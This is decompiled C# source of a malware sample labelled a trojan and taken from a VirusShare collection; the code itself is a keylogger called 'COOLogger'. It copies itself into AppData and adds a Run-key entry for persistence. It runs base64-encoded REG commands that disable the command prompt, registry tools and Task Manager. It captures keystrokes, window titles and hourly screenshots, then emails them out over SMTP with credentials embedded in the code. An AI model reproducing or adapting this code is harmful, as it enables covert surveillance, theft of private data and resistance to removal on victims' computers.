// Decompiled with JetBrains decompiler
// Type: iRREqRnBPwOzEdS
// Assembly: RSPC_UPDATED_FEB2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DF55B2BD-0613-4E13-AA88-910621410B91
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-80bafcef0529e03f23dbc99148c83e958ede8543.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class iRREqRnBPwOzEdS
{
  private static string PJbYuRpvrDHVqsC = "YWxpY2VfeWFuZ19sQGhvdG1haWwuY29t";
  private static string LGjzSmGzpVeechT = "YnJvbmNvczEyMw==";
  private static string MTxKKZdgYwMFoWZ = "smtp.live.com";
  private static int tWaoyUhUHiFDfNe = 587;
  private static string RREqRnBPwOzEdSP;
  private static string JbYuRpvrDHVqsCL;
  private static string GjzSmGzpVeechTM;
  private static string TxKKZdgYwMFoWZt;
  private static string WaoyUhUHiFDfNeQ;
  private static string tJNQHgJoYUJdTKY;
  private static int lHuEcXzCiDIQGlu = 3600000;
  private static string wtRBLRNZpqMOXuc = (string) null;
  private static string wKUEDqcEamBizlp = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFN5c3RlbSAvdiBEaXNhYmxlQ01EIC90IFJFR19EV09SRCAvZCAxIC9m";
  private static string QECvOLhDbhdpsId = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlUmVnaXN0cnlUb29scyAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";
  private static string enxsWlEYrlbHQRP = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";
  private static object QUtUfZroMhGxuGX = (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static string utyVcjObaqtwoNc = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static MailMessage VFnpKmqFCkxXXyH = new MailMessage();
  private static SmtpClient nnPXkMfLjBNBysL = new SmtpClient();
  [AccessedThroughProperty("nPXkMfLjBNBysLI")]
  private static IeOZfbmEFablJpT _nPXkMfLjBNBysLI;
  private static object WowmSNOMRDvDhIt;
  private static RichTextBox maaBKWySxVnznke;

  static iRREqRnBPwOzEdS()
  {
    iRREqRnBPwOzEdS.nPXkMfLjBNBysLI = new IeOZfbmEFablJpT();
    iRREqRnBPwOzEdS.WowmSNOMRDvDhIt = (object) Path.GetFileName(Application.ExecutablePath);
    iRREqRnBPwOzEdS.maaBKWySxVnznke = new RichTextBox();
  }

  private static IeOZfbmEFablJpT nPXkMfLjBNBysLI
  {
    get => iRREqRnBPwOzEdS._nPXkMfLjBNBysLI;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      if (iRREqRnBPwOzEdS._nPXkMfLjBNBysLI != null)
        IeOZfbmEFablJpT.KeyDown -= new IeOZfbmEFablJpT.KeyDownEventHandler(iRREqRnBPwOzEdS.YiRREqRnBPwOzEd);
      iRREqRnBPwOzEdS._nPXkMfLjBNBysLI = value;
      if (iRREqRnBPwOzEdS._nPXkMfLjBNBysLI == null)
        return;
      IeOZfbmEFablJpT.KeyDown += new IeOZfbmEFablJpT.KeyDownEventHandler(iRREqRnBPwOzEdS.YiRREqRnBPwOzEd);
    }
  }

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetForegroundWindow();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int LWnCKLVsnRSyFYg(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

  [STAThread]
  public static void main()
  {
    iRREqRnBPwOzEdS.tJNQHgJoYUJdTKY = Conversions.ToString(true);
    iRREqRnBPwOzEdS.GjzSmGzpVeechTM = Conversions.ToString(true);
    iRREqRnBPwOzEdS.TxKKZdgYwMFoWZt = Conversions.ToString(true);
    iRREqRnBPwOzEdS.WaoyUhUHiFDfNeQ = Conversions.ToString(false);
    iRREqRnBPwOzEdS.JbYuRpvrDHVqsCL = Conversions.ToString(true);
    iRREqRnBPwOzEdS.RREqRnBPwOzEdSP = Conversions.ToString(true);
    if (!Operators.ConditionalCompareObjectEqual((object) Application.StartupPath, iRREqRnBPwOzEdS.QUtUfZroMhGxuGX, false))
    {
      using (System.IO.File.Create(Conversions.ToString(Operators.ConcatenateObject(iRREqRnBPwOzEdS.QUtUfZroMhGxuGX, (object) "\\FnpKmqFCkxXXyHT.txt"))))
        ;
      StreamWriter streamWriter = new StreamWriter(iRREqRnBPwOzEdS.utyVcjObaqtwoNc + "\\FnpKmqFCkxXXyHT.txt");
      streamWriter.Write(Application.ExecutablePath);
      streamWriter.Flush();
      streamWriter.Close();
      if (System.IO.File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(iRREqRnBPwOzEdS.QUtUfZroMhGxuGX, (object) "\\"), iRREqRnBPwOzEdS.WowmSNOMRDvDhIt))))
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(iRREqRnBPwOzEdS.QUtUfZroMhGxuGX, (object) "\\"), iRREqRnBPwOzEdS.WowmSNOMRDvDhIt)));
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(iRREqRnBPwOzEdS.QUtUfZroMhGxuGX, (object) "\\"), iRREqRnBPwOzEdS.WowmSNOMRDvDhIt)));
      }
      else
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(iRREqRnBPwOzEdS.QUtUfZroMhGxuGX, (object) "\\"), iRREqRnBPwOzEdS.WowmSNOMRDvDhIt)));
      NewLateBinding.LateCall((object) null, typeof (Process), "Start", new object[1]
      {
        Operators.AddObject(Operators.AddObject(iRREqRnBPwOzEdS.QUtUfZroMhGxuGX, (object) "\\"), iRREqRnBPwOzEdS.WowmSNOMRDvDhIt)
      }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      ProjectData.EndApp();
    }
    if (Conversions.ToBoolean(iRREqRnBPwOzEdS.RREqRnBPwOzEdSP) && RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue(Conversions.ToString(iRREqRnBPwOzEdS.WowmSNOMRDvDhIt))) == null)
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(iRREqRnBPwOzEdS.WowmSNOMRDvDhIt), Operators.ConcatenateObject(Operators.ConcatenateObject(iRREqRnBPwOzEdS.QUtUfZroMhGxuGX, (object) "\\"), iRREqRnBPwOzEdS.WowmSNOMRDvDhIt));
    if (Conversions.ToBoolean(iRREqRnBPwOzEdS.JbYuRpvrDHVqsCL))
    {
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString((object) MyProject.Computer.FileSystem.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(iRREqRnBPwOzEdS.QUtUfZroMhGxuGX, (object) "\\FnpKmqFCkxXXyHT.txt")))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    if (Conversions.ToBoolean(iRREqRnBPwOzEdS.GjzSmGzpVeechTM))
      Interaction.Shell(iRREqRnBPwOzEdS.SPJbYuRpvrDHVqs(iRREqRnBPwOzEdS.wKUEDqcEamBizlp), AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(iRREqRnBPwOzEdS.TxKKZdgYwMFoWZt))
      Interaction.Shell(iRREqRnBPwOzEdS.SPJbYuRpvrDHVqs(iRREqRnBPwOzEdS.QECvOLhDbhdpsId), AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(iRREqRnBPwOzEdS.WaoyUhUHiFDfNeQ))
      Interaction.Shell(iRREqRnBPwOzEdS.SPJbYuRpvrDHVqs(iRREqRnBPwOzEdS.enxsWlEYrlbHQRP), AppWinStyle.NormalFocus);
    System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
    timer1.Interval = 3600000;
    timer1.Tick += new EventHandler(iRREqRnBPwOzEdS.eOZfbmEFablJpTi_Ticked);
    timer1.Start();
    System.Windows.Forms.Timer timer2 = new System.Windows.Forms.Timer();
    timer2.Interval = 300;
    timer2.Tick += new EventHandler(iRREqRnBPwOzEdS.PWowmSNOMRDvDhI_Ticked);
    timer2.Start();
    iRREqRnBPwOzEdS.nPXkMfLjBNBysLI.iPWowmSNOMRDvDh();
    Application.Run();
  }

  private static string WCwxvBlszQrqHwy()
  {
    string lpString = new string(char.MinValue, 100);
    iRREqRnBPwOzEdS.LWnCKLVsnRSyFYg(iRREqRnBPwOzEdS.GetForegroundWindow(), ref lpString, 100);
    return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
  }

  public static string SPJbYuRpvrDHVqs(string LfINalGTHsUqpRy) => Encoding.ASCII.GetString(Convert.FromBase64String(LfINalGTHsUqpRy));

  public static void eOZfbmEFablJpTi_Ticked(object sender, EventArgs e)
  {
    if (Conversions.ToBoolean(iRREqRnBPwOzEdS.tJNQHgJoYUJdTKY))
    {
      Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
      string Right = iRREqRnBPwOzEdS.TtfvyCtSvaKGuPG(6);
      bitmap.Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(iRREqRnBPwOzEdS.QUtUfZroMhGxuGX, (object) "\\"), (object) Right), (object) ".jpeg")));
      try
      {
        MailMessage message = new MailMessage();
        Attachment attachment = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(iRREqRnBPwOzEdS.QUtUfZroMhGxuGX, (object) "\\"), (object) Right), (object) ".jpeg")));
        message.From = new MailAddress(iRREqRnBPwOzEdS.SPJbYuRpvrDHVqs(iRREqRnBPwOzEdS.PJbYuRpvrDHVqsC));
        message.To.Add(iRREqRnBPwOzEdS.SPJbYuRpvrDHVqs(iRREqRnBPwOzEdS.PJbYuRpvrDHVqsC));
        message.Subject = "COOLogger Logs From - " + Environment.UserName;
        message.Body = iRREqRnBPwOzEdS.maaBKWySxVnznke.Text;
        message.Attachments.Add(attachment);
        SmtpClient smtpClient = new SmtpClient("smtp.live.com")
        {
          Port = 587,
          EnableSsl = true,
          Credentials = (ICredentialsByHost) new NetworkCredential(iRREqRnBPwOzEdS.SPJbYuRpvrDHVqs(iRREqRnBPwOzEdS.PJbYuRpvrDHVqsC), iRREqRnBPwOzEdS.SPJbYuRpvrDHVqs(iRREqRnBPwOzEdS.LGjzSmGzpVeechT))
        };
        smtpClient.EnableSsl = true;
        smtpClient.Send(message);
        iRREqRnBPwOzEdS.maaBKWySxVnznke.Text = "";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    else
    {
      MailMessage vfnpKmqFckxXxyH = iRREqRnBPwOzEdS.VFnpKmqFCkxXXyH;
      vfnpKmqFckxXxyH.From = new MailAddress(iRREqRnBPwOzEdS.SPJbYuRpvrDHVqs(iRREqRnBPwOzEdS.PJbYuRpvrDHVqsC));
      vfnpKmqFckxXxyH.To.Add(iRREqRnBPwOzEdS.SPJbYuRpvrDHVqs(iRREqRnBPwOzEdS.PJbYuRpvrDHVqsC));
      vfnpKmqFckxXxyH.Subject = "COOLogger Logs from - " + Environment.UserName;
      vfnpKmqFckxXxyH.Body = iRREqRnBPwOzEdS.maaBKWySxVnznke.Text;
      SmtpClient nnPxkMfLjBnBysL = iRREqRnBPwOzEdS.nnPXkMfLjBNBysL;
      nnPxkMfLjBnBysL.Host = "smtp.live.com";
      nnPxkMfLjBnBysL.Port = 587;
      nnPxkMfLjBnBysL.EnableSsl = true;
      nnPxkMfLjBnBysL.Credentials = (ICredentialsByHost) new NetworkCredential(iRREqRnBPwOzEdS.SPJbYuRpvrDHVqs(iRREqRnBPwOzEdS.PJbYuRpvrDHVqsC), iRREqRnBPwOzEdS.SPJbYuRpvrDHVqs(iRREqRnBPwOzEdS.LGjzSmGzpVeechT));
      nnPxkMfLjBnBysL.Send(iRREqRnBPwOzEdS.VFnpKmqFCkxXXyH);
      iRREqRnBPwOzEdS.maaBKWySxVnznke.Text = "";
    }
  }

  public static void YiRREqRnBPwOzEd(Keys e) => iRREqRnBPwOzEdS.maaBKWySxVnznke.Text += iRREqRnBPwOzEdS.nPXkMfLjBNBysLI.ItJNQHgJoYUJdTK(e);

  public static void PWowmSNOMRDvDhI_Ticked(object sender, EventArgs e)
  {
    if (Operators.CompareString(iRREqRnBPwOzEdS.wtRBLRNZpqMOXuc, iRREqRnBPwOzEdS.WCwxvBlszQrqHwy(), false) == 0)
      return;
    iRREqRnBPwOzEdS.wtRBLRNZpqMOXuc = iRREqRnBPwOzEdS.WCwxvBlszQrqHwy();
    if (Operators.CompareString(iRREqRnBPwOzEdS.wtRBLRNZpqMOXuc, "", false) == 0)
      return;
    RichTextBox maaBkWySxVnznke = iRREqRnBPwOzEdS.maaBKWySxVnznke;
    maaBkWySxVnznke.Text = maaBkWySxVnznke.Text + "\r\n\r\n~~~~~" + iRREqRnBPwOzEdS.wtRBLRNZpqMOXuc + " (" + DateAndTime.Now.ToLongTimeString() + ")~~~~~\r\n";
  }

  public static string TtfvyCtSvaKGuPG(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }
}
